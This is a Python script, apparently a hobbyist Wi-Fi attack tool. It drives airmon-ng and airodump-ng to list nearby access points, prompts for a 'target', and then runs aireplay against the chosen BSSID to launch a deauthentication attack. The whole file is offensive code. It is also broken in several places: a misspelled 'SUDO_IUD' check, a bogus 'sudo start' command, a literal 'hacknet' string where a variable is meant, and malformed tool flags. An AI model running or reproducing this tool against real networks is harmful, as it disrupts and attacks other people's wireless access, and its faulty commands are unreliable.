import subprocess
import re
import os
import csv
import time
import shutil
from datetime import datetime

activeWirelessNetworks = []


def checkForEssid(essid, lst):
    checkStatus = True
    if len(lst) == 0:
        return checkStatus
    for item in lst:
        if essid in item["ESSID"]:
            checkStatus = False
    return checkStatus


if not "SUDO_IUD" in os.environ.keys():
    print("Access denied, Are you root?")
    exit()

for fileName in os.listdir():
    if ".csv" in fileName:
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("Backup Folder Exists")
            timestamp = datetime.now()
            shutil.move(fileName, directory + "/backup" +
                        str(timestamp) + "-" + fileName)

wlanPattern = re.compile(r"wlan[0-9]")
checkWifiResult = wlanPattern.findall(subprocess.run(
    ["iw", "dev"], capture_output=True).stdout.decode())
if len(checkWifiResult) == 0:
    print("No wifi card found")
    exit()

print("Select a wifi card to use:")
for index, item in enumerate(checkWifiResult):
    print(f"{index} - {item}")

while True:
    wifiInterfaceChoice = input("Enter the interface to use: ")
    try:
        if checkWifiResult[int(wifiInterfaceChoice)]:
            wifiName = checkWifiResult[int(wifiInterfaceChoice)]
            break
    except:
        print("Invalid choice")

hacknet = checkWifiResult[int(wifiInterfaceChoice)]

print("Innitializing wifi card, Killing conflicting processes")
killConflictingProcesses = subprocess.run(
    ["sudo", "airmon-ng", "check", "kill", hacknet], capture_output=True)
discoverAccessPoints = subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1",
                                        "output-format", "csv", hacknet + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)
        for fileName in os.listdir():
            fieldNames = ["BSSID", "First time seen", "Last time seen", "channel", "Speed", "Privacy",
                          "Cipher", "Authentication", "Power", "beacons", "IV", "LAN IP", "ID-length", "ESSID", "Key"]
            if ".csv" in fileName:
                with open(fileName, "r") as file:
                    reader = csv.DictReader(file, fieldnames=fieldNames)
                    for row in reader:
                        if row["BSSID"] == "BSSID":
                            pass
                        elif row["BSSID"] == "Station MAC":
                            break
                        elif checkForEssid(row["ESSID"], activeWirelessNetworks):
                            activeWirelessNetworks.append(row)
        for index, item in enumerate(activeWirelessNetworks):
            print(
                f"{index} - {item['ESSID']} - {item['BSSID']} - {item['Power']} - {item['channel']}")
            time.sleep(1)
except KeyboardInterrupt:
    print("\n Ready to attack")


while True:
    try:
        target = int(input("Enter the target number: "))
        if activeWirelessNetworks[int(target)]:
            break
    except:
        print("Invalid choice")


hackBssid = activeWirelessNetworks[int(target)]["BSSID"]
hackChannel = activeWirelessNetworks[int(target)]["channel"].strip()

subprocess.run(["sudo", "start", "hacknet" + "mon", hackChannel])

subprocess.run(["sudo", "aireplay", "0", "-a", hackBssid,
               checkWifiResult[int(wifiInterfaceChoice)] + "mon"])
